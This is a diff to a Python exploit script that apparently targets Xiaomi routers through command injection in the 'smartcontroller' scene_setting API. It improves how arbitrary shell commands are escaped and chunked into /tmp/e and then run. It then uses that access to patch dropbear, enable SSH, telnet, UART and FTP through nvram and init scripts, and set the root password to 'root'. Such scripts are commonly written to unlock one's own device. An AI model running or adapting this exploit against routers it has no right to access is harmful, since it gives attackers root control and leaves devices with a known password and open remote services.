@@ -125,6 +125,8 @@ def exec_tiny_cmd(cmd, act_delay = 0):
         dres = json.loads(res)
         code = dres['code']
     except Exception:
+        if res == 'Internal Server Error':
+            die(f'Exploit "smartcontroller" not working! [{res}]')
         raise ExploitError(f'Error on parse response for command "scene_setting" => {res}')
     if code != 0:
         raise ExploitError(f'Error on exec command "scene_setting" => {res}')
@@ -142,6 +144,7 @@ def exec_tiny_cmd(cmd, act_delay = 0):
         code = dres['code']
     except Exception:
         if res.find('504 Gateway Time-out') > 0 and act_delay > 0:
+            print('___[504]___')
             time.sleep(act_delay)
             code = 0
         else:
@@ -161,28 +164,44 @@ def exec_tiny_cmd(cmd, act_delay = 0):
     return res
 
 def exec_cmd(command):
+    #reset_smart_task()
+    spec_sym = [ '"', '\\', '`', '$' ]
     fn = '/tmp/e'
-    fcmd = 'echo -n "{txt}"{amode}{fn}'
-    flen = len(fcmd.format(txt="", amode="", fn=fn))
-    pos = 0
-    while True:
-        amode = ">" if pos == 0 else ">>"
-        txtlen = max_cmd_len - flen - len(amode)
-        txt = command[pos:pos+txtlen]
-        pos += len(txt)
-        if len(txt) == 0:
-            break # End of Command
-        if txt.find("'") >= 0 and txt.find('"') >= 0:
-            raise ExploitError(f'Incorrect shell command (1)')
-        fmt_cmd = fcmd
-        if txt.find('"') >= 0:
-            fmt_cmd = fcmd.replace('"', "'")
-        cmd = fmt_cmd.format(txt=txt, amode=amode, fn=fn)
+    fcmd = 'echo -n{spec} "{txt}"{amode}{fn}'
+    flen = len(fcmd.format(spec="", txt="", amode="", fn=fn))
+    amode = ">"
+    txtlst = [ ]
+    txt = ""
+    for sym in command:
+        max_txt_len = max_cmd_len - flen - len(amode)
+        if len(txt) >= max_txt_len:
+            txtlst.append(txt)
+            amode = '>>'
+            txt = ""
+        if sym in spec_sym:
+            if len(txt) > 0:
+                txtlst.append(txt)
+            txtlst.append(sym)
+            amode = '>>'
+            txt = ""
+            continue
+        txt += sym
+    if len(txt) > 0:
+        txtlst.append(txt)
+    #print(txtlst)
+    amode = ">"
+    for i, txt in enumerate(txtlst):
+        amode = ">" if i == 0 else ">>"
+        spec = ""
+        if len(txt) == 1 and txt in spec_sym:
+            spec = "e"
+            txt = f"\\{txt}"
+        cmd = fcmd.format(spec=spec, txt=txt, amode=amode, fn=fn)
         #print(f"[{cmd}]")
         exec_tiny_cmd(cmd, act_delay = 2)
         pass
     exec_tiny_cmd(f"chmod +x {fn}", act_delay = 2)
-    exec_tiny_cmd(f"sh {fn}", act_delay = 5)
+    exec_tiny_cmd(f"sh {fn}", act_delay = 2)
 
 def get_dev_systime():
     # http://192.168.31.1/cgi-bin/luci/;stok=14b996378966455753104d187c1150b4/api/misystem/sys_time
@@ -259,7 +278,7 @@ time.sleep(1)
 set_dev_systime(dst)
 if not sc_activated:
     reset_smart_task()
-    die('Exploit not working!!!')
+    die('Exploit "smartcontroller" not working!!!')
 
 #print('Logger ...')
 #res = exec_cmd("logger hello")
@@ -268,8 +287,8 @@ if not sc_activated:
 
 print('Unlock dropbear service ...')
 res = exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
-print('Unlock SSH and TelNet servers ...')
-res = exec_cmd("nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit")
+print('Unlock SSH server ...')
+res = exec_cmd("nvram set ssh_en=1; nvram set telnet_en=1; nvram commit")
 print('Set password for "root" user (password: "root") ...')
 res = exec_cmd(r"echo -e 'root\nroot' | passwd root")
 print('Enable dropbear service ...')
@@ -290,11 +309,29 @@ else:
 
 if not ssh_en:
     print("")
+    print('Unlock TelNet server ...')
+    exec_cmd("[ `bdata get telnet_en` != '1' ] && bdata set telnet_en=1 && bdata commit")
     print('Run TelNet server on port 23 ...')
-    res = exec_cmd("/etc/init.d/telnet restart")
-    time.sleep(3)
+    exec_cmd("/etc/init.d/telnet enable; /etc/init.d/telnet restart")
+    time.sleep(0.5)
     gw.use_ssh = False
     telnet_en = gw.ping(verbose = 2)
+    if not telnet_en:
+        print(f"ERROR: TelNet server not responding (IP: {gw.ip_addr})")
+        sys.exit(1)
     print("")
     print('#### TelNet server are activated! ####')
+    #print("")
+    #print('Run FTP server on port 21 ...')
+    gw.run_cmd('/etc/init.d/inetd enable')
+    gw.run_cmd('/etc/init.d/inetd restart')
+    gw.use_ftp = True
+    ftp_en = gw.ping(verbose = 0)
+    if ftp_en:
+        print('#### FTP server are activated! ####')
+    else:
+        print(f"WARNING: FTP server not responding (IP: {gw.ip_addr})")
+
+if ssh_en or telnet_en:
+    gw.run_cmd('nvram set uart_en=1; nvram set boot_wait=on; nvram set bootdelay=3; nvram commit')
 
